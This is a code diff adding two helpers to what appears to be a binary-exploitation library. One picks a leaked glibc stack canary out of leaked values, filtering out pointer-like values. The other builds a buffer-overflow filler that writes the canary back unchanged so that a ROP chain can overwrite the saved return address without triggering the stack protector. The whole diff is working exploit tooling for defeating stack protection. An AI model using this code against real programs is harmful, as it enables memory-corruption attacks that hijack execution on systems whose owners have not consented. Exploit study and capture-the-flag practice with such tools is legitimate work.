@@ -292,6 +292,40 @@ def got_entry(data: bytes, name: str):
     return None
 
 
+def find_canary(vals):
+    """A leaked stack canary from a set of leaked values (a %p dump / an over-read). glibc's canary
+    is a full-width random word with its LOW BYTE forced to 0x00 (so a string read stops before it
+    leaks accidentally), so it reads as: low byte 0x00, the rest non-zero and high-entropy, and it
+    is NOT a canonical pointer (not the 0x5.../0x7f... ranges of PIE code / stack / libc). Returns
+    the first value matching that shape, or None. A caller that knows the exact leak slot should
+    pass that value directly rather than rely on this heuristic."""
+    for v in vals:
+        v = int(v)
+        if v & 0xFF:                                     # low byte must be the 0x00 terminator
+            continue
+        if v >> 8 == 0:                                  # not zero
+            continue
+        if v < 0x1000000000000:                          # a canary fills the top bytes; small -> no
+            continue
+        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF:        # looks like a PIE code pointer
+            continue
+        if 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:        # looks like a stack / libc / mmap pointer
+            continue
+        return v
+    return None
+
+
+def build_canary_prefix(canary_offset: int, canary: int, ret_offset: int) -> bytes:
+    """The overflow filler that reaches the saved return address WITHOUT tripping the stack
+    protector: pad to the canary slot, write the leaked canary back unchanged, then pad across the
+    saved frame pointer to the return slot. The caller appends the ROP chain / target address."""
+    body = bytearray(b"A" * canary_offset)
+    body += struct.pack("<Q", canary & 0xFFFFFFFFFFFFFFFF)
+    gap = ret_offset - canary_offset - 8
+    body += b"B" * max(0, gap)
+    return bytes(body)
+
+
 def resolve_libc_base(leaked: int, sym_offset: int):
     """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
     is page-aligned; anything else means the leak was not the pointer we assumed, so return None
